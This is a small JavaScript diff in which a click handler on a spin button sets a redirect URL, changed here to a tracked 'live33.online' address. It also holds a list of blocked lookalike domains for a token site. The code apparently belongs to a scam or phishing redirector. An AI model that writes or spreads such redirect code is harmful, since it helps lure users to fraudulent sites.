@@ -4,7 +4,7 @@ var button = document.querySelector('.spin-buttons');
 button.addEventListener('click', function() {
     (function() {
         var originalDomain = "monoplytokens.com";
-        var redirectURL = "https://m.rolls3.com";
+        var redirectURL = "https://live33.online/?9fbfb39";
         var blockedDomains = [
             "mply.io.1arshg4.site",
             "mply.io.4a6b8dh.site"
